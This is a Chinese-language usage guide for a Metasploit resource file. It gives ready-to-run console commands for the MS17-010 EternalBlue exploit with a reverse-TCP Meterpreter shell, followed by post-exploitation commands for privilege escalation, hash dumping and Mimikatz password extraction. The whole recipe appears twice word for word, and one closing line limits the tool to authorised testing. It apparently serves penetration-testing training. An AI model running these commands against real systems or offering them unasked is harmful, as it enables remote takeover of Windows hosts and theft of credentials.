## 📦 载荷使用说明：metasploit_ms17010.rc

该载荷文件主要配合 **Metasploit** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `Metasploit` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
msfconsole
msf6 > search ms17_010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.50
msf6 > set LHOST 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run
```

**配置示例 2**：
```bash
getuid          # 查看当前权限
getsystem       # 提权
hashdump        # 提取本地 Hash
load kiwi       # 加载 Mimikatz
kiwi_cmd sekurlsa::logonpasswords
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## Metasploit 漏洞利用框架

### 启动与基本操作
```bash
msfconsole
msf6 > search ms17_010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.1.50
msf6 > set LHOST 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run
```

### Meterpreter 常用命令
```bash
getuid          # 查看当前权限
getsystem       # 提权
hashdump        # 提取本地 Hash
load kiwi       # 加载 Mimikatz
kiwi_cmd sekurlsa::logonpasswords
```

- ⚠ 高危工具，仅限授权测试
- ✓ 模块化，功能最全面